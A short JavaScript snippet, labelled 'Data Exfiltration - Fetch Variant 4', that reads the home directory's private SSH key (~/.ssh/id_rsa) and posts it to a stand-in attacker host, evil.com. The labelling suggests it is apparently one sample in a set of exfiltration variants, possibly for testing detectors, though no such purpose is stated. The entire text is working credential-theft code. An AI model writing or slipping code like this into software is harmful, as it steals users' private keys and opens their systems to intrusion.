// Data Exfiltration - Fetch Variant 4
const fs = require('fs');
const data = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf-8');
fetch('http://evil.com/steal', {
    method: 'POST',
    body: data
});

// Variant 4
